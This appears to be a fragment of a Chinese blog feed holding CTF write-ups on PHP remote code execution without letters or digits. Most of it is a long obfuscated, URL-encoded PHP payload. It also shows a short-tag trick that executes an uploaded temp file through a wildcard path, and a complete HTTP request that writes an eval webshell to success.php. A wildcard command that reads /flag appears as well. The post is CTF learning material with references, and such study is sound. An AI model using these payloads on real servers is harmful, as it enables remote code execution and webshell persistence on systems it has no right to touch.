operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">27</span>_<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">5</span>b_<span class="token operator">%</span><span class="token number">5</span>d<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>b</span></code></pre><p>æ³¨æ„è¿™ä¸¤ä¸ªpayloadåˆ©ç”¨çš„è¯è¦phpç‰ˆæœ¬å°äº7æ‰èƒ½æˆåŠŸåˆ©ç”¨ï¼Œ</p><blockquote><p>php5ä¸­assertæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>$f=&#39;assert&#39;;$f(...);</code>è¿™æ ·çš„æ–¹æ³•æ¥åŠ¨æ€æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><p>ä½†php7ä¸­ï¼Œ<code>assert</code>ä¸å†æ˜¯å‡½æ•°ï¼Œå˜æˆäº†ä¸€ä¸ªè¯­è¨€ç»“æ„ï¼ˆç±»ä¼¼<code>eval</code>ï¼‰ï¼Œä¸èƒ½å†ä½œä¸ºå‡½æ•°ååŠ¨æ€æ‰§è¡Œä»£ç ï¼Œæ‰€ä»¥åˆ©ç”¨èµ·æ¥ç¨å¾®å¤æ‚ä¸€ç‚¹ã€‚ä½†ä¹Ÿæ— éœ€è¿‡äºæ‹…å¿ƒï¼Œæ¯”å¦‚æˆ‘ä»¬åˆ©ç”¨<code>file_put_contents</code>å‡½æ•°ï¼ŒåŒæ ·å¯ä»¥ç”¨æ¥<code>getshell</code>ã€‚</p></blockquote><p>æµ‹è¯•ç»“æœå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/image-20200809170716430.png" alt loading="lazy"></p><h3 id="çŸ­æ ‡ç­¾"><a href="#çŸ­æ ‡ç­¾" class="headerlink" title="çŸ­æ ‡ç­¾"></a>çŸ­æ ‡ç­¾</h3><p>PHPä¸­æœ‰ä¸¤ç§çŸ­æ ‡ç­¾ï¼Œ<code>&lt;??&gt;</code>å’Œ<code>&lt;?=?&gt;</code>ã€‚å…¶ä¸­ï¼Œ<code>&lt;??&gt;</code>ç›¸å½“äºå¯¹<code>&lt;?php&gt;</code>çš„æ›¿æ¢ã€‚è€Œ<code>&lt;?=?&gt;</code>åˆ™æ˜¯ç›¸å½“äº<code>&lt;? echo&gt;</code>.</p><p>ä¾‹å¦‚ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token string single-quoted-string">'whoami'</span><span class="token delimiter important">?></span></span>  //è¾“å‡º  whoami<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token string backtick-quoted-string">`whoami`</span><span class="token delimiter important">?></span></span>  //è¾“å‡º  å‘½ä»¤æ‰§è¡Œåçš„ç»“æœ</code></pre><p>PHPä¸­POSTä¸Šä¼ æ–‡ä»¶ä¼šæŠŠæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶æš‚æ—¶å­˜åœ¨<code>/tmp</code>æ–‡ä»¶å¤¹ä¸­ï¼Œé»˜è®¤æ–‡ä»¶åæ˜¯<code>/tmp/phpXXXXXX</code>ï¼Œæ–‡ä»¶åæœ€å6ä¸ªå­—ç¬¦æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯ã€‚</p><p>å°è¯•ç”Ÿæˆæ‰§è¡Œçš„æ–‡ä»¶ï¼Œpayloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">.</span> <span class="token operator">/</span><span class="token operator">??</span><span class="token operator">?</span><span class="token operator">/</span><span class="token operator">??</span><span class="token operator">??</span><span class="token operator">??</span><span class="token operator">??</span><span class="token punctuation">[</span>@<span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span></code></pre><p>æœ€åçš„<code>[@-[]</code>è¡¨ç¤ºASCIIåœ¨<code>@</code>å’Œ<code>[</code>ä¹‹é—´çš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯å¤§å†™å­—æ¯ï¼Œæ‰€ä»¥æœ€åä¼šæ‰§è¡Œçš„æ–‡ä»¶æ˜¯<code>tmp</code>æ–‡ä»¶å¤¹ä¸‹ç»“å°¾æ˜¯å¤§å†™å­—æ¯çš„æ–‡ä»¶ã€‚</p><p>expæ•°æ®åŒ…</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/?exp=?>&lt;?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?></span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header-name keyword">Host:</span> xxxxxx:2333<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="token header-name keyword">Content-Type:</span>multipart/form-data;boundary=--------123<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1<span class="token header-name keyword">Content-Length:</span> 106----------123<span class="token header-name keyword">Content-Disposition:</span>form-data;name="file";filename="1.txt"echo "&lt;?php eval(\$_POST['shell']);" > success.php----------123--</code></pre><p>å³å¯<code>getshell</code></p><p>æ‹¿<code>flag</code>çš„è¯è¿˜å¯ä»¥ä½¿ç”¨é€šé…ç¬¦</p><pre class="language-php" data-language="php"><code class="language-php">code=?><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token string backtick-quoted-string">`/???/??? /????`</span><span class="token delimiter important">?></span></span></code></pre><p>å…¶ä¸­<code>/???/??? /????</code>åŒ¹é…<code>/bin/cat /flag</code>ï¼Œè¿™æ ·ä¹Ÿèƒ½å¾—åˆ°<code>flag</code></p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell</a></li><li><a href="https://xz.aliyun.com/t/7181">é€šè¿‡ä¸€é“ä»£ç å®¡è®¡é¢˜ç›®æ¥ç»ƒä¹ æ— æ•°å­—å­—æ¯æ„é€ webshell</a></li><li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡</a></li><li><a href="https://xz.aliyun.com/t/8107">æ— å­—æ¯æ•°å­—webshellæ€»ç»“</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> å¤‡å¿˜å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> CTFé¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    
    
    <entry>
      <title>CTFSHOW-WEB_AKèµ›</title>
      <link href="posts/f7521cf/"/>
      <url>posts/f7521cf/</url>
      
        <content type="html"><![CDATA[<p>åœ¨èœé¸¡çš„é“è·¯ä¸Šè¶Šèµ°è¶Šè¿œã€‚ã€‚ã€‚æ·¦ï¼</p><span id="more"></span><h3 id="ç­¾åˆ°-è§‚å·±"><a href="#ç­¾åˆ°-è§‚å·±" class="headerlink" title="ç­¾åˆ°_è§‚å·±"></a>ç­¾åˆ°_è§‚å·±</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/php/i'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span 